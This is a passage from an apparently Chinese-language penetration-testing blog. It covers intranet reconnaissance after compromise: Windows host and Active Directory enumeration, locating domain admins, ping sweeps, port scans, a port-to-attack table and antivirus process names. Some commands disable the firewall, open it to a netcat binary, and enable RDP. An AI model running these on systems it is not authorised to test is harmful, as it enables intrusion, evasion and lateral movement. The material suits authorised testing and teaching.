SNMP（简单网管协议）服务器可以泄露很多信息甚至导致设备被远程攻陷</p><p>msf 框架中包含了一个内置辅助模块 scanner/snmp/snmp_enum，RO 与 RW 权限的团体字符串猜解与获取很重要</p><h2 id="内网信息收集"><a href="#内网信息收集" class="headerlink" title="内网信息收集"></a>内网信息收集</h2><h3 id="本机信息收集"><a href="#本机信息收集" class="headerlink" title="本机信息收集"></a>本机信息收集</h3><h4 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 1. 网络配置</span></span><br><span class="line">ipconfig /all</span><br><span class="line"><span class="meta">#</span><span class="bash"> 2. 操作系统及软件信息</span></span><br><span class="line">systeminfo  # 版本信息</span><br><span class="line">echo %PROCESSOR_ARCHITECTURE%  # 体系结构</span><br><span class="line">wmic product get name,version  # 利用 wmic,  参考 https://blog.csdn.net/discover2210212455/article/details/82711930</span><br><span class="line">powershell &quot;&quot; # https://docs.microsoft.com/zh-cn/powershell/scripting/samples/collecting-information-about-computers?view=powershell-7.1</span><br><span class="line"><span class="meta">#</span><span class="bash"> 3. 本机服务信息</span></span><br><span class="line">wmic service list brief</span><br><span class="line"><span class="meta">#</span><span class="bash"> 4. 进程列表</span></span><br><span class="line">tasklist</span><br><span class="line">wmic process list brief</span><br><span class="line"><span class="meta">#</span><span class="bash"> 5. 启动程序信息</span></span><br><span class="line">wmic startup get command,caption</span><br><span class="line"><span class="meta">#</span><span class="bash"> 6. 计划任务</span></span><br><span class="line">schtasks /query /fo LIST /v  # 必须要是 Administrator 执行，不然会报错</span><br><span class="line"><span class="meta">#</span><span class="bash"> 7. 主机开机时间</span></span><br><span class="line">net statistics workstation</span><br><span class="line"><span class="meta">#</span><span class="bash"> 8. 查询用户列表</span></span><br><span class="line">net user  # 本机用户列表</span><br><span class="line">net localgroup administrators  # 本地管理员信息（通常包含域用户）</span><br><span class="line">query user || qwinsta  # 查看当前在线用户</span><br><span class="line"><span class="meta">#</span><span class="bash"> 9. 列出或断开本地计算机与所连接得客户端之间的会话</span></span><br><span class="line">net session</span><br><span class="line"><span class="meta">#</span><span class="bash"> 10. 查询端口列表</span></span><br><span class="line">netstat -ano</span><br><span class="line"><span class="meta">#</span><span class="bash"> 11. 补丁列表</span></span><br><span class="line">systeminfo</span><br><span class="line">wmic qfe get caption,description,hotfixid,installedon</span><br><span class="line"><span class="meta">#</span><span class="bash"> 12. 本机共享列表</span></span><br><span class="line">net share</span><br><span class="line">wmic share get name,path,status</span><br><span class="line"><span class="meta">#</span><span class="bash"> 13. 路由表及所有可用接口的 ARP 缓存表</span></span><br><span class="line">route print</span><br><span class="line">arp -a</span><br><span class="line"><span class="meta">#</span><span class="bash"> 14. 防火墙相关配置</span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># (1) 关闭防火墙</span></span></span><br><span class="line">netsh firewall set opmode disable  # Windows Server 2003 及之前的版本</span><br><span class="line">netsh advfirewall set allprofiles state off  # Windows Server 2003 之后的版本</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># (2) 防火墙配置</span></span></span><br><span class="line">netsh firewall show config</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># (3) 修改防火墙配置</span></span></span><br><span class="line">netsh firewall add allowedprogram C:\nc.exe &quot;allow nc&quot; enable  # Windows Server 2003 及之前的版本，允许指定程序全部连接</span><br><span class="line">netsh advfirewall firewall add rule name=&quot;pass nc&quot; dir=in action=allow program=&quot;C:\nc.exe&quot;  # Windows Server 2003 之后的版本，允许指定程序进入</span><br><span class="line">netsh advfirewall firewall add rule name=&quot;allow nc&quot; dir=out action=allow program=&quot;C:\nc.exe&quot;  # 同上，允许指定程序退出</span><br><span class="line">netsh advfirewall firewall add rule name=&quot;Remote Desktop&quot; protocol=TCP dir=in localport=3389 action=allow  # 同上，允许 3389 端口放行</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># (4) 自定义防火墙日志的储存位置</span></span></span><br><span class="line">netsh advfirewall set currentprofile logging filename &quot;C:\windows\temp\shit.log&quot;</span><br><span class="line"><span class="meta">#</span><span class="bash"> 15. 代理配置情况</span></span><br><span class="line">reg query &quot;HKEY_CURRENT_USER\SoftWare\Microsoft\Windows\CurrentVersion\Internet Settings&quot;</span><br><span class="line"><span class="meta">#</span><span class="bash"> 16. 查询并开启远程连接服务</span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># (1) 查看远程连接端口</span></span></span><br><span class="line">reg query &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /V PortNumber  # 结果为 0xd3d，转换后为 3389</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># (2) 在 Windows Server 2003 中开启 3389 端口</span></span></span><br><span class="line">wmic path win32_terminalservicesetting where (__CLASS != &quot;&quot;) call setallowtsconnections 1</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># (3) 在 Windows Server 2008 和 Windows Server 2012 中开启 3389 端口</span></span></span><br><span class="line">wmic /namespace:\\root\cimv2\terminalservices path win32_terminalservicesetting where (__CLASS != &quot;&quot;) call setallowtsconnections 1</span><br><span class="line">wmic /namespace:\\root\cimv2\terminalservices path win32_tsgeneralsetting where (TerminalName = &#x27;RDP-Tcp&#x27;) call setuserauthenticationrequired 1</span><br><span class="line">req add &quot;HKLM\SYSTEM\CURRENT\CONTROLSET\CONTROL\TERMINAL SERVER&quot; /v fSingleSessionPerUser /t REG_DWORD /d 0 /f</span><br></pre></td></tr></table></figure><h4 id="常见杀毒软件进程"><a href="#常见杀毒软件进程" class="headerlink" title="常见杀毒软件进程"></a>常见杀毒软件进程</h4><table><thead><tr><th>进程</th><th>软件名称</th></tr></thead><tbody><tr><td>360sd.exe</td><td>360杀毒</td></tr><tr><td>360tray.exe</td><td>360实时保护</td></tr><tr><td>ZhuDongFangYu.exe</td><td>360主动防御</td></tr><tr><td>KSafeTray.exe</td><td>金山卫士</td></tr><tr><td>SafeDogUpdateCenter.exe</td><td>服务器安全狗</td></tr><tr><td>McAfree McShield.exe</td><td>McAfee</td></tr><tr><td>egui.exe</td><td>NOD32</td></tr><tr><td>AVP.EXE</td><td>卡巴斯基</td></tr><tr><td>avguard.exe</td><td>小红伞</td></tr><tr><td>bdagent.exe</td><td>BitDefender</td></tr></tbody></table><h4 id="WMIC-脚本自动收集信息"><a href="#WMIC-脚本自动收集信息" class="headerlink" title="WMIC 脚本自动收集信息"></a>WMIC 脚本自动收集信息</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">for /f &quot;delims=&quot; %%A in (&#x27;dir /s /b %WINDIR%\system32\*htable.xsl&#x27;) do set &quot;var=%%A&quot;</span><br><span class="line"></span><br><span class="line">wmic process get CSName,Description,ExecutablePath,ProcessId /format:&quot;%var%&quot; &gt;&gt; out.html</span><br><span class="line">wmic service get Caption,Name,PathName,ServiceType,Started,StartMode,StartName /format:&quot;%var%&quot; &gt;&gt; out.html</span><br><span class="line">wmic USERACCOUNT list full /format:&quot;%var%&quot; &gt;&gt; out.html</span><br><span class="line">wmic group list full /format:&quot;%var%&quot; &gt;&gt; out.html</span><br><span class="line">wmic nicconfig where IPEnabled=&#x27;true&#x27; get Caption,DefaultIPGateway,Description,DHCPEnabled,DHCPServer,IPAddress,IPSubnet,MACAddress /format:&quot;%var%&quot; &gt;&gt; Du1L0v3_WMIC_out.html</span><br><span class="line">wmic volume get Label,DeviceID,DriveLetter,FileSystem,Capacity,FreeSpace /format:&quot;%var%&quot; &gt;&gt; out.html</span><br><span class="line">wmic netuse list full /format:&quot;%var%&quot; &gt;&gt; out.html</span><br><span class="line">wmic qfe get Caption,Description,HotFixID,InstalledOn /format:&quot;%var%&quot; &gt;&gt; out.html</span><br><span class="line">wmic startup get Caption,Command,Location,User /format:&quot;%var%&quot; &gt;&gt; out.html</span><br><span class="line">wmic PRODUCT get Description,InstallDate,InstallLocation,PackageCache,Vendor,Version /format:&quot;%var%&quot; &gt;&gt; out.html</span><br><span class="line">wmic os get name,version,InstallDate,LastBootUpTime,LocalDateTime,Manufacturer,RegisteredUser,ServicePackMajorVersion,SystemDirectory /format:&quot;%var%&quot; &gt;&gt; out.html</span><br><span class="line">wmic Timezone get DaylightName,Description,StandardName /format:&quot;%var%&quot; &gt;&gt; out.html</span><br></pre></td></tr></table></figure><h3 id="查询当前权限"><a href="#查询当前权限" class="headerlink" title="查询当前权限"></a>查询当前权限</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">whoami  # 当前权限</span><br><span class="line">whoami /all  # 获取域 SID</span><br><span class="line">net user XXX /domain  # 指定用户的详细信息</span><br></pre></td></tr></table></figure><h3 id="判断是否存在域"><a href="#判断是否存在域" class="headerlink" title="判断是否存在域"></a>判断是否存在域</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ipconfig /all</span><br><span class="line">nslookup xxxx.xxxx  # 反向解析查询来判断域控和DNS是否在同一服务器上</span><br><span class="line"><span class="meta">#</span><span class="bash"> 信息</span></span><br><span class="line">systeminfo</span><br><span class="line">net config workstation</span><br><span class="line"><span class="meta">#</span><span class="bash"> 判断主域</span></span><br><span class="line">net time /domain</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># 1. 存在域但当前用户不是域用户，会报错 &quot;系统错误5 拒绝访问&quot;</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># 2. 存在域且当前用户是域用户，则成功完成命令</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># 3. 当前网络环境为工作组，不存在域，则会报错 &quot;找不到域 WORKGROUP 的域控制器&quot;</span></span></span><br></pre></td></tr></table></figure><h3 id="探测域内存活主机"><a href="#探测域内存活主机" class="headerlink" title="探测域内存活主机"></a>探测域内存活主机</h3><p>可以分时间段进行探测，以对比存活主机及对应的 IP</p><h4 id="NetBIOS-快速探测内网"><a href="#NetBIOS-快速探测内网" class="headerlink" title="NetBIOS 快速探测内网"></a>NetBIOS 快速探测内网</h4><p>NetBIOS 是局域网程序使用的一种应用程序编程接口</p><p>nbtscan 是一个命令行工具，用于扫描本地或远程 TCP/IP 网络上的开放 NetBIOS 名称服务器，将其上传到目标主机中，输入 IP 地址范围并运行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nbtscan.exe 192.168.1.0/24</span><br></pre></td></tr></table></figure><h5 id="参数说明"><a href="#参数说明" class="headerlink" title="参数说明"></a>参数说明</h5><table><thead><tr><th>Token</th><th>含义</th></tr></thead><tbody><tr><td>SHARING</td><td>该机器中存在正在运行的文件和打印共享服务，但不一定有内容共享</td></tr><tr><td>DC</td><td>该机器可能是域控</td></tr><tr><td>U=USER</td><td>该机器中有登录名为 User 的用户（不太准确</td></tr><tr><td>IIS</td><td>该机器中可能安装了 IIS 服务器</td></tr><tr><td>EXCHANGE</td><td>该机器中可能安装了 Exchange</td></tr><tr><td>NORTTES</td><td>该机器中可能安装了 Lotus Notes 电子邮件客户端</td></tr><tr><td>？</td><td>没有识别出该机器的 NetBIOS 资源（可以使用 -F 选项再次扫描</td></tr></tbody></table><h4 id="ICMP-协议快速探测内网"><a href="#ICMP-协议快速探测内网" class="headerlink" title="ICMP 协议快速探测内网"></a>ICMP 协议快速探测内网</h4><p>依次对内网中的每个 IP 执行 ping 命令，可以快速找出内网中所有存活的主机，使用如下命令循环探测整个 C 段</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.1.%I | findstr &quot;TTL=&quot;</span><br></pre></td></tr></table></figure><p>VBS 脚本</p><figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">strSubNet = <span class="string">&quot;192.168.1.&quot;</span></span><br><span class="line"><span class="keyword">Set</span> objFSO = <span class="built_in">CreateObject</span>(<span class="string">&quot;Scripting.FileSystemObject&quot;</span>)</span><br><span class="line"><span class="keyword">Set</span> objTS = objfso.CreateTextFile(<span class="string">&quot;C:\Windows\Temp\Result.txt&quot;</span>)</span><br><span class="line"><span class="keyword">For</span> i = <span class="number">1</span> <span class="keyword">To</span> <span class="number">254</span></span><br><span class="line">strComputer = strSubNet &amp; i</span><br><span class="line">blnResult = Ping(strComputer)</span><br><span class="line"><span class="keyword">If</span> blnResult = <span class="literal">True</span> <span class="keyword">Then</span></span><br><span class="line">objTS.WriteLine strComputer &amp; <span class="string">&quot; is alived :)&quot;</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line"><span class="keyword">Next</span></span><br><span class="line">objTS.Close</span><br><span class="line">WScript.Echo <span class="string">&quot;All Ping Scan, All Done :)&quot;</span></span><br><span class="line"><span class="keyword">Function</span> Ping(strComputer)</span><br><span class="line"><span class="keyword">Set</span> objWMIService = <span class="built_in">GetObject</span>(<span class="string">&quot;winmgmts:\\.\root\cimv2&quot;</span>)</span><br><span class="line"><span class="keyword">Set</span> colItems = objWMIService.ExecQuery(<span class="string">&quot;Select * From Win32_PingStatus Where Address=&#x27;&quot;</span> &amp; strComputer &amp; <span class="string">&quot;&#x27;&quot;</span>)</span><br><span class="line"><span class="keyword">For</span> <span class="keyword">Each</span> objItem <span class="keyword">In</span> colItems</span><br><span class="line"><span class="keyword">Select</span> <span class="keyword">case</span> objItem.statusCode</span><br><span class="line"><span class="keyword">Case</span> <span class="number">0</span></span><br><span class="line">Ping = <span class="literal">True</span></span><br><span class="line"><span class="keyword">Case</span> <span class="keyword">Else</span></span><br><span class="line">Ping = <span class="literal">False</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">select</span></span><br><span class="line"><span class="keyword">Next</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Function</span></span><br></pre></td></tr></table></figure><p>Shell 脚本</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">for i in &#123;1..254&#125;;do</span><br><span class="line">&#123;</span><br><span class="line">ping -c1 -W1 10.10.1.$i &amp;&amp; echo &quot;10.10.1.$i&quot; is alive;</span><br><span class="line">&#125;&amp;</span><br><span class="line">done</span><br><span class="line">wait</span><br></pre></td></tr></table></figure><h4 id="ARP-扫描探测内网"><a href="#ARP-扫描探测内网" class="headerlink" title="ARP 扫描探测内网"></a>ARP 扫描探测内网</h4><ul><li>arp-scan</li><li>Empire 的 arpscan 模块</li><li>Nishang 的 Invoke-ARPScan.ps1 脚本</li></ul><h4 id="常规-TCP-UDP-端口扫描探测内网"><a href="#常规-TCP-UDP-端口扫描探测内网" class="headerlink" title="常规 TCP/UDP 端口扫描探测内网"></a>常规 TCP/UDP 端口扫描探测内网</h4><p>ScanLine</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scanline -h -t 22,80-89,110,389,445,3389,1099,1433,2049,6379,7001,8080,1521,3306,5432 -u 53,161,137,139 -O log.txt -p 192.168.1.1-254 /b</span><br></pre></td></tr></table></figure><h3 id="扫描域内端口"><a href="#扫描域内端口" class="headerlink" title="扫描域内端口"></a>扫描域内端口</h3><ul><li>telnet</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">telnet DC 22</span><br></pre></td></tr></table></figure><ul><li>S 扫描器</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">S.exe TCP 192.168.1.1 192.168.1.254 445,3389,1433,7001,1099,8080,80,22,23,21,25,110,3306,5432,1521,6379,2049,111 256 /Banner /save</span><br></pre></td></tr></table></figure><ul><li>PowerSploit 的 Invoke-portscan.ps1 脚本</li><li>Nishang 的 Invoke-PortScan.ps1 脚本</li></ul><h4 id="端口-Banner-信息"><a href="#端口-Banner-信息" class="headerlink" title="端口 Banner 信息"></a>端口 Banner 信息</h4><ul><li><code>安全焦点</code>：<a href="http://www.securityfocus.com/bid">http://www.securityfocus.com/bid</a></li><li><code>Exploit-DB</code>：<a href="https://www.exploit-db.com/">Exploit Database - Exploits for Penetration Testers, Researchers, and Ethical Hackers (exploit-db.com)</a></li></ul><h5 id="常见端口及说明"><a href="#常见端口及说明" class="headerlink" title="常见端口及说明"></a>常见端口及说明</h5><ul><li>文件共享服务端口</li></ul><table><thead><tr><th>端口号</th><th>端口说明</th><th>使用说明</th></tr></thead><tbody><tr><td>21、22、69</td><td>FTP/TFTP 文件传输协议</td><td>允许匿名的上传、下载、爆破和嗅探操作</td></tr><tr><td>2049</td><td>NFS 服务</td><td>配置不当</td></tr><tr><td>139</td><td>SAMBA 服务</td><td>爆破、未授权访问、远程代码执行</td></tr><tr><td>389</td><td>LDAP 目录访问协议</td><td>注入、允许匿名访问、弱口令</td></tr></tbody></table><ul><li>远程连接服务端口</li></ul><table><thead><tr><th>端口号</th><th>端口说明</th><th>使用说明</th></tr></thead><tbody><tr><td>22</td><td>SSH 远程连接</td><td>爆破、SSH 隧道及内网代理转发、文件传输</td></tr><tr><td>23</td><td>Telnet 远程连接</td><td>爆破、嗅探、弱口令</td></tr><tr><td>3389</td><td>RDP 远程桌面连接</td><td>Shift 后门（Windows Server 2003 及以下版本）、爆破</td></tr><tr><td>5900</td><td>VNC</td><td>弱口令爆破</td></tr><tr><td>5632</td><td>PcAnywhere 服务</td><td>抓取密码、代码执行</td></tr></tbody></table><ul><li>Web 应用服务端口</li></ul><table><thead><tr><th>端口号</th><th>端口说明</th><th>使用说明</th></tr></thead><tbody><tr><td>80、443、8080</td><td>常见的 Web 服务端口</td><td>Web 攻击、爆破、对应服务器版本漏洞</td></tr><tr><td>7001、7002</td><td>WebLogic 控制台</td><td>Java 反序列化、弱口令</td></tr><tr><td>8080、8089</td><td>JBoss/Resin/Jetty/Jenkins</td><td>反序列化、控制台弱口令</td></tr><tr><td>9090</td><td>WebSphere 控制台</td><td>Java 反序列化、弱口令</td></tr><tr><td>4848</td><td>GlassFish 控制台</td><td>弱口令</td></tr><tr><td>1352</td><td>Lotus Domino 邮件服务</td><td>弱口令、信息泄露、爆破</td></tr><tr><td>1000</td><td>webmin 控制面板</td><td>弱口令</td></tr></tbody></table><ul><li>数据库服务端口</li></ul><table><thead><tr><th>端口号</th><th>端口说明</th><th>使用说明</th></tr></thead><tbody><tr><td>3306</td><td>MySQL 数据库</td><td>注入、提权、爆破</td></tr><tr><td>1433</td><td>MSSQL 数据库</td><td>注入、提权、SA 弱口令、爆破</td></tr><tr><td>1521</td><td>Oracle 数据库</td><td>TNS 爆破、注入、反弹 SHELL</td></tr><tr><td>5432</td><td>PostgreSQL 数据库</td><td>爆破、注入、弱口令</td></tr><tr><td>27017、27018</td><td>MongoDB 数据库</td><td>爆破、未授权访问</td></tr><tr><td>6379</td><td>Redis 数据库</td><td>可尝试未授权访问、弱口令爆破</td></tr><tr><td>5000</td><td>Sysbase/DB2 数据库</td><td>爆破、注入</td></tr></tbody></table><ul><li>邮件服务端口</li></ul><table><thead><tr><th>端口号</th><th>端口说明</th><th>使用说明</th></tr></thead><tbody><tr><td>25</td><td>SMTP 邮件服务</td><td>邮件伪造</td></tr><tr><td>110</td><td>POP 协议</td><td>爆破、嗅探</td></tr><tr><td>143</td><td>IMAP 协议</td><td>爆破</td></tr></tbody></table><ul><li>网络常见协议端口</li></ul><table><thead><tr><th>端口号</th><th>端口说明</th><th>使用说明</th></tr></thead><tbody><tr><td>53</td><td>DNS 域名系统</td><td>允许区域传送、DNS 劫持、缓存投毒、欺骗</td></tr><tr><td>67、68</td><td>DHCP 服务</td><td>劫持、欺骗</td></tr><tr><td>161</td><td>SNMP 协议</td><td>爆破、搜集目标内网信息</td></tr></tbody></table><ul><li>特殊服务端口</li></ul><table><thead><tr><th>端口号</th><th>端口说明</th><th>使用说明</th></tr></thead><tbody><tr><td>2181</td><td>ZooKeeper 服务</td><td>未授权访问</td></tr><tr><td>8069</td><td>Zabbix 服务</td><td>远程执行、SQL 注入</td></tr><tr><td>9200、9300</td><td>Elasticsearch 服务</td><td>远程执行</td></tr><tr><td>11211</td><td>Memcached 服务</td><td>未授权访问</td></tr><tr><td>512、513、514</td><td>Linux rexec 服务</td><td>爆破、远程登陆</td></tr><tr><td>873</td><td>rsync 服务</td><td>匿名访问、文件上传</td></tr><tr><td>3690</td><td>SVN 服务</td><td>SVN 泄露、未授权访问</td></tr><tr><td>50000</td><td>SAP Management Console</td><td>远程执行</td></tr></tbody></table><h3 id="收集域内基本信息"><a href="#收集域内基本信息" class="headerlink" title="收集域内基本信息"></a>收集域内基本信息</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">net view /domain  # 查询域</span><br><span class="line">net view /domain:HACKE  # 查询域内所有计算机</span><br><span class="line">net group /domain  # 查询域内所有用户组列表</span><br><span class="line">net group &quot;domain computers&quot; /domain  # 查询所有域成员计算机列表</span><br><span class="line">net accounts /domain  # 获取域密码信息（域密码策略、密码长度、错误锁定等</span><br><span class="line">nltest /domain_trusts  # 获取域信任信息</span><br></pre></td></tr></table></figure><h3 id="查找域控制器"><a href="#查找域控制器" class="headerlink" title="查找域控制器"></a>查找域控制器</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">nltest /DCLIST:hacke  # 查看域控制器的机器名</span><br><span class="line">nslookup -type=SRV _ldap._tcp  # 查看域控制器的主机名</span><br><span class="line">net time /domain  # 查看当前时间</span><br><span class="line">net group &quot;Domain Controllers&quot; /domain  # 查看域控制器组</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># 一般一个域中会存在多个域控制器，如果主控制器故障则可以保证正常工作</span></span></span><br><span class="line">netdom query pdc  # 查看域控制器组（主控</span><br></pre></td></tr></table></figure><h3 id="获取域内用户及管理员信息"><a href="#获取域内用户及管理员信息" class="headerlink" title="获取域内用户及管理员信息"></a>获取域内用户及管理员信息</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 1. 查询所有域用户列表</span></span><br><span class="line">net user /domain  # 向域控制器进行查询</span><br><span class="line">wmic useraccount get /all  # 获取域内用户详细信息</span><br><span class="line">dsquery user  # 查看存在的用户（应该是域控才有</span><br><span class="line">net localgroup administrators  # 查询本地管理员组用户</span><br><span class="line"><span class="meta">#</span><span class="bash"> 2. 查询域管理员用户组</span></span><br><span class="line">net group &quot;domain admins&quot; /domain  # 查询域管理员用户</span><br><span class="line">net group &quot;Enterprise Admins&quot; /domain  # 查询管理员用户组</span><br></pre></td></tr></table></figure><p>常用 dsquery 命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">dsquery computer  # 查找目录中的计算机</span><br><span class="line">dsquery contact  # 查找目录中的联系人</span><br><span class="line">dsquery subnet  # 查找目录中的子网</span><br><span class="line">dsquery group  # 查找目录中的组</span><br><span class="line">dsquery ou  # 查找目录中的组织单位</span><br><span class="line">dsquery site  # 查找目录中的站点</span><br><span class="line">dsquery server  # 查找目录中的 AD DC/LDS 实例</span><br><span class="line">dsquery user  # 查找目录中的用户</span><br><span class="line">dsquery quota  # 查找目录中的配额规定</span><br><span class="line">dsquery partition  # 查找目录中的分区</span><br><span class="line">dsquery *  # 用通用的 LDAP 查询来查找目录中的任何对象</span><br></pre></td></tr></table></figure><h3 id="定位域管理员"><a href="#定位域管理员" class="headerlink" title="定位域管理员"></a>定位域管理员</h3><p>定位域管理员的常规渠道，一是日志，二是会话，日志是本地机器的管理员日志，可以使用脚本或 Wevutil 工具导出并查看，会话是指域内每台机器的登录会话，可以使用 netsess.exe 或 PowerView.exe 等工具查询（可以匿名查询，不需要权限）</p><ul><li>psloggedon.exe：<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/psloggedon">https://docs.microsoft.com/en-us/sysinternals/downloads/psloggedon</a></li><li>PVEFindADUser.exe：<a href="https://github.com/chrisdee/Tools/tree/master/AD/ADFindUsersLoggedOn">https://github.com/chrisdee/Tools/tree/master/AD/ADFindUsersLoggedOn</a></li><li>netview.exe：<a href="https://github.com/mubix/netview">GitHub - mubix/netview: Netview enumerates systems using WinAPI calls</a></li><li>Nmap 的 NSE 脚本：<a href="https://nmap.org/nsedoc/scripts/smb-enum-sessions.html">https://nmap.org/nsedoc/scripts/smb-enum-sessions.html</a></li><li>PowerView 脚本：<a href="https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerView">https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerView</a></li><li>Empire 的 user_hunter 模块</li></ul><h3 id="查找域管理进程"><a href="#查找域管理进程" class="headerlink" title="查找域管理进程"></a>查找域管理进程</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 1. 本机检查</span></span><br><span class="line">net group &quot;Domain Admins&quot; /domain  # 获取域管理员列表</span><br><span class="line">tasklist /v  # 列出本机的所有进程及进程用户，寻找进程所有者为域管理员的进程</span><br><span class="line"><span class="meta">#</span><span class="bash"> 2. 查询域控制器的域用户会话</span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># 原理：在域控制器中查询域用户会话列表，并将其与域管理员列表进行交叉引用，从而得到域管理会话的系统列表</span></span></span><br><span class="line">net group &quot;Domain Controllers&quot; /domain  # 查询域控制器列表</span><br><span class="line">net group &quot;Domain Admins&quot; /domain  # 收集域管理员列表</span><br><span class="line">NetSess -h  # 利用 NetSess.exe 收集所有活动域的会话列表</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># 交叉引用域管理员列表与活动会话列表</span></span></span><br><span class="line"><span 